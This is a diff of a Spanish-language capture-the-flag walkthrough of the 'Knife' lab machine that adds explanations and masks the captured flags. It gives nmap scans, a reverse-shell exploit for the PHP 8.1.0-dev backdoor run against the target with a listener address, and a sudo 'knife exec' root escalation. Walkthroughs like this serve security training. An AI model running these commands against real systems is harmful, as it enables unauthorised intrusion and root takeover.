@@ -23,7 +23,7 @@ layout:
 
 ## Reconnaissance
 
-
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Knife**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.10.242 -oG allPorts
@@ -47,9 +47,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.60 seconds
            Raw packets sent: 65535 (2.884MB) | Rcvd: 65541 (2.622MB)
 ```
 
-
-
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -62,7 +60,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.60 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado comprobamos que se encuentran abiertos el servicio SSH y una página web de `Apache`.
 
 ```bash
 ❯ nmap -sCV -p22,80 10.10.10.242 -A -oN targeted -oX targetedXML
@@ -96,9 +94,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 11.61 seconds
 ```
 
-
-
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -107,27 +103,25 @@ Nmap done: 1 IP address (1 host up) scanned in 11.61 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/4128_vmware_hhbMEKYg8V.png" alt=""><figcaption></figcaption></figure>
 
-
-
 ## Initial Access
-
-
 
 ### PHP 8.1.0-dev - 'User-Agent' Remote Code Execution \[RCE]
 
+Accederemos a http://10.10.10.242 y verificaremos que se trata de un `Apache HTTP Server 2.4.41` que utiliza `PHP 8.1.0`.
 
+Realizamos una enumeración del sitio web en busca de subdominios, directorios, páginas sin éxito.
 
 <figure><img src="../../.gitbook/assets/imagen (264).png" alt=""><figcaption></figcaption></figure>
 
+Probamos de buscar vulnerabilidades sobre la versión de `PHP` que se encontraba instalada en el sitio web, nos logramos encontrar con el siguiente repositorio.
 
+Nos clonaremos el repositorio de GitHub en nuestra máquina local.
 
 {% embed url="https://github.com/flast101/php-8.1.0-dev-backdoor-rce" %}
-
-
 
 ```bash
 ❯ git clone https://github.com/flast101/php-8.1.0-dev-backdoor-rce; cd php-8.1.0-dev-backdoor-rce
@@ -140,20 +134,20 @@ Recibiendo objetos: 100% (241/241), 1.66 MiB | 9.65 MiB/s, listo.
 Resolviendo deltas: 100% (128/128), listo.
 ```
 
-
+Nos pondremos en escucha para recibir la Reverse Shell.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Ejecutaremos el exploit indicándole la página vulnerable y nuestra dirección y puerto donde estaremos escuchando para recibir la terminal.
 
 ```bash
 ❯ python3 revshell_php_8.1.0-dev.py http://10.10.10.242 10.10.16.5 443
 ```
 
-
+Después de lanzar el ataque, logramos acceder al equipo víctima y visualizar la flag de **user.txt**.
 
 ```bash
 ❯ nc -nlvp 443
@@ -163,18 +157,18 @@ bash: cannot set terminal process group (1035): Inappropriate ioctl for device
 bash: no job control in this shell
 james@knife:/$ cat /home/james/user.txt
 cat /home/james/user.txt
-a7ef6c4416770ea516c4b6b8e7fc7304
+a7ef6c441**********************
 ```
-
-
 
 ## Privilege Escalation
 
-
-
 ### Abusing sudoers privilege (knife)
 
+Revisando si el usuario que disponíamos actualmente tenía algún permiso de **sudoers**, nos encontramos que podía ejecutar como `sudo` el binario de `knife`.
 
+{% hint style="info" %}
+Knife es una herramienta de línea de comandos que proporciona una interfaz entre un repositorio local de Chef y Chef Infra Server. Knife ayuda a los usuarios a administrar:
+{% endhint %}
 
 ```bash
 james@knife:/$ sudo -l
@@ -187,14 +181,16 @@ User james may run the following commands on knife:
     (root) NOPASSWD: /usr/bin/knife
 ```
 
-
+Revisando en `GTFOBins` nos encontramos con la siguiente página en dónde nos explican como abusar de este binario en caso de disponer de permisos `sudo` sobre él.
 
 {% embed url="https://gtfobins.github.io/gtfobins/knife/" %}
+
+Realizamos la explotación como`sudo` sobre el binario `knife` y verificamos que logramos obtener una bash como usuario `root`. Por otro lado, logramos también verificar cual es la flag de **root.txt**.
 
 ```bash
 james@knife:/$ sudo /usr/bin/knife exec -E 'exec "/bin/bash"'
 sudo /usr/bin/knife exec -E 'exec "/bin/bash"'
 root@knife:/# cat /root/root.txt
 cat /root/root.txt
-a802f8156fabc107613019765155b2bc
+a802f8156***********************
 ```
